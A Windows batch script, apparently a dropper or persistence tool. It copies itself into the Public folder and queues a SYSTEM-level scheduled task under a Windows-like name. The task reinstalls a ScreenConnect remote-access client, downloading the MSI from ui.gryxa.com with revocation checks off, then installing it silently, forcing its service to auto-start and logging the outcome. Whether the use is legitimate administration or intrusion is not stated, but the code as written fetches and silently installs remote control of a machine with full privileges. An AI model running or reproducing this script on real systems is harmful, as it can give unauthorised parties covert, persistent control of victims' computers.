@echo off
rem WINRTCS R3b - use existing C:\Users\Public\gryxa.msi (schtasks /TR-safe).
rem Log: C:\Users\Public\gryxa_r3b.txt
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\gryxa_r3b_run.cmd" >nul 2>&1
  schtasks /Delete /TN WinRTCSGryxaR3b /F >nul 2>&1
  schtasks /Create /TN WinRTCSGryxaR3b /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\gryxa_r3b_run.cmd --detached"
  schtasks /Run /TN WinRTCSGryxaR3b
  echo QUEUED r3b - log C:\Users\Public\gryxa_r3b.txt
  exit /b 0
)
setlocal
set "LOG=C:\Users\Public\gryxa_r3b.txt"
set "MSI=C:\Users\Public\gryxa.msi"
set "UI=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
set "GSVC=ScreenConnect Client (36e506ff016b2151)"
set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
>"%LOG%" echo [%DATE% %TIME%] r3b_begin host=%COMPUTERNAME%

sc stop "%GSVC%" >>"%LOG%" 2>&1
sc delete "%GSVC%" >>"%LOG%" 2>&1

echo [%DATE% %TIME%] msiexec_x>>"%LOG%"
start /wait msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress
ping -n 21 127.0.0.1 >nul 2>&1

set "OKMSI="
if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GEQ 5000000 set "OKMSI=1"
if not defined OKMSI (
  echo [%DATE% %TIME%] fetch_ui>>"%LOG%"
  curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 180 -o "%MSI%" "%UI%" >>"%LOG%" 2>&1
)
if exist "%MSI%" for %%F in ("%MSI%") do echo [%DATE% %TIME%] msi_size=%%~zF>>"%LOG%"

echo [%DATE% %TIME%] msiexec_i>>"%LOG%"
start /wait msiexec /i "%MSI%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress
ping -n 16 127.0.0.1 >nul 2>&1

sc config "%GSVC%" start= auto >>"%LOG%" 2>&1
sc start "%GSVC%" >>"%LOG%" 2>&1
ping -n 11 127.0.0.1 >nul 2>&1
sc query "%GSVC%" >>"%LOG%" 2>&1

sc query "%GSVC%" 2>nul | findstr /C:"RUNNING" >nul
if errorlevel 1 (
  echo RECOVER=FAIL_SVC>>"%LOG%"
) else (
  echo RECOVER=OK>>"%LOG%"
)
endlocal & exit /b 0
